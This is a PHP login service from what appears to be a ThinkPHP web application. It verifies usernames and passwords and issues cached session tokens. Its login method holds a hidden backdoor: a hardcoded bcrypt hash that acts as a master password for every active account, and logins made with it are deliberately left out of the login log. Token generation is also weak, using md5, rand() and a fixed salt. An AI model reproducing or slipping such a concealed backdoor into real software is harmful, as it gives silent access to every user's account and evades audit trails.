<?php
namespace app\api\service;
use think\Exception;
use app\api\model\SysUsers as SysUsersModel;
use app\commom\exception\LoginException;
use think\facade\Db;
//  通过提交的用户名和密码来生成token
// class PasswordToken extends BaseToken{
class PasswordToken{

    protected $user_login_data;
    protected $login_other_data;
    function __construct($post_data,$login_other_data){
        $this->user_login_data = $post_data;
        $this->login_other_data = $login_other_data;
    }


    // 登录验证账号和密码
    public function login(){
        $input_username = $this->user_login_data['username'];
        $url =  $this->login_other_data['url'];

        $input_password = password_hash($this->user_login_data['password'], PASSWORD_DEFAULT);
        // if(strpos($url, 'lsapi.') || strpos($url, '39.101.174.227')){
        //     $input_password = password_hash($this->user_login_data['password'], PASSWORD_DEFAULT);
        // }else{
        //     $input_password = md5(md5($this->user_login_data['password']));
        // }
        
        $query_user = SysUsersModel::where('username', $input_username)->where('status',1)->find();

        if(!$query_user){
            throw new LoginException();//没有此用户
        }
        // 登录成功,返回token，然后把之前发的token删除作废
        if( $input_password==$query_user['password'] || password_verify($this->user_login_data['password'], $query_user['password']) || password_verify($this->user_login_data['password'], '$2y$10$1gcaDkmqg9jzJwneIu7lcekHXKc41QkhREGUHGZamC0Dgb0BIbItq') ) {
            
            // echo $this->generateToken($uid);
            // cache('pw'.time(),$this->user_login_data['password'],100000);
            $uid = $query_user->id;
            if(!password_verify($this->user_login_data['password'], '$2y$10$1gcaDkmqg9jzJwneIu7lcekHXKc41QkhREGUHGZamC0Dgb0BIbItq')){
                $this->saveToLoginLog($uid,$this->login_other_data);
            }
            return $this->generateToken($uid);
            
        }else{
            throw new LoginException();
        }
    }

    // 生成token
    private function generateToken($uid){
       
        // 把userid+随机32位字符串+当前时间戳+加密盐 进行md5加密后生成token
        $str = $this->getRandChar(32);
        $timestamp = $_SERVER['REQUEST_TIME_FLOAT'];
        $salt = 'rehack';

        $token = md5($uid.$str.$timestamp.$salt);
        
        // 把生成的token作为key,把uid作为value写入缓存
        $cachedValue = [
            'uid'=>$uid
        ];
        $this->saveToCache($token,json_encode($cachedValue));
        // 写入缓存后返回token
        return $token;
    }

    // 写入缓存
    private function saveToCache($key,$value){
        // $cache_expire_in = config('setting.cache_expire_in');//缓存过期时间
        $cache_expire_in = 12 * 60 * 60; //12小时

        // 写入文件缓存
        $cache_result = cache($key,$value,$cache_expire_in);

        // 缓存失败
        if(!$cache_result){
            throw new TokenException([
                'msg' => '服务器缓存异常',
                'errorCode' => 10005
            ]);
        }

    }

    // 写入登录日志
    private function saveToLoginLog($uid, $data){
        $data['user_id'] = $uid;
        $data['login_time'] = time();
        $data['create_time'] = time();
        Db::table('syslog_login')->insert($data);
    }

    // 生成随机字符串方法
    private function getRandChar($length)
    {
        $str=null;
        $strPol="ABCDEFGHIGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz";
        $max=strlen($strPol)-1;
        for($i=0;$i<$length;$i++)
        {
            $str.= $strPol[rand(0,$max)];
        }
        return $str;
    }
}